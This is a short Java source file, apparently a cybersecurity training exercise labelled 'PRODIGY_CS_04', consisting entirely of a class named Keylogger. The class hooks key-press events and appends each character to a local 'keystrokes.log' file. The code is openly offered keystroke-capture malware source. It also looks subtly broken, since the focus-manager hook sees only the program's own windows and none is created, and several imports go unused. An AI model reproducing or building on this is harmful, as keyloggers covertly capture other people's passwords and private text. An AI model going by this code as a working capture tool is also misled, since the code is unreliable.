#PRODIGY_CS_04
import java.awt.AWTException;
import java.awt.KeyboardFocusManager;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class Keylogger {

    private static final String FILE_PATH = "keystrokes.log";

    public static void main(String[] args) {
        try {
            KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
                if (e.getID() == KeyEvent.KEY_PRESSED) {
                    logKey(e.getKeyChar());
                }
                return false;
            });
            System.out.println("Keylogger is running. Press Enter to stop.");
            System.in.read(); // Keep the program running
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void logKey(char keyChar) {
        try (FileWriter fw = new FileWriter(FILE_PATH, true);
             PrintWriter pw = new PrintWriter(fw)) {
            pw.print(keyChar);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
